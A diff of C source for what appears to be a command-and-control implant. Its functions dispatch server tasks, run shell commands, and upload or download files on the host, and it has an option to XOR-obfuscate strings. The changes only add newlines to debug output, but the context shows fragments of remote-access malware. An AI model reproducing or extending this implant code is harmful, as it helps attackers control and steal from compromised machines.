@@ -25,7 +25,7 @@ VOID CommandDispatcher()
     DWORD    TaskCommand = 0;
 
 #if CONFIG_OBF_STRINGS
-    unsigned char* obf_str = XOR_STR("Command Dispatcher...");
+    unsigned char* obf_str = XOR_STR("Command Dispatcher...\n");
     _tprintf(deobfuscate(obf_str) );
 #else
     _tprintf( "Command Dispatcher...");
@@ -34,7 +34,7 @@ VOID CommandDispatcher()
     do
     {
         if ( ! Instance.Session.Connected ){
-            _tprintf("Instance not connected...");
+            _tprintf("Instance not connected...\n");
             return;
         }
 
@@ -71,9 +71,9 @@ VOID CommandDispatcher()
                     }
 
                     if ( ! FoundCommand )
-                        _tprintf( "Command not found !!" );
+                        _tprintf( "Command not found !!\n" );
 
-                } else _tprintf( "Is COMMAND_NO_JOB" );
+                } else _tprintf( "Is COMMAND_NO_JOB\n" );
 
             } while ( Parser.Length > 4 );
 
@@ -86,7 +86,7 @@ VOID CommandDispatcher()
         }
         else
         {
-            _tprintf( "Transport: Failed" );
+            _tprintf( "Transport: Failed\n" );
             break;
         }
 
@@ -97,7 +97,7 @@ VOID CommandDispatcher()
 
 VOID CommandShell( PPARSER Parser )
 {
-    _tprintf( "Command::Shell" );
+    _tprintf( "Command::Shell\n" );
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -144,7 +144,7 @@ VOID CommandShell( PPARSER Parser )
 
 VOID CommandUpload( PPARSER Parser )
 {
-    _tprintf( "Command::Upload" );
+    _tprintf( "Command::Upload\n" );
 
     PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
     UINT32   FileSize = 0;
@@ -156,7 +156,7 @@ VOID CommandUpload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s (FileSize: %d)", FileName, FileSize );
+    printf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );
 
     hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );
 
@@ -184,7 +184,7 @@ Cleanup:
 
 VOID CommandDownload( PPARSER Parser )
 {
-    _tprintf( "Command::Download");
+    _tprintf( "Command::Download\n");
 
     PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
     DWORD    FileSize = 0;
@@ -196,7 +196,7 @@ VOID CommandDownload( PPARSER Parser )
 
     FileName[ NameSize ] = 0;
 
-    printf( "FileName => %s", FileName );
+    printf( "FileName => %s\n", FileName );
 
     hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
     if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
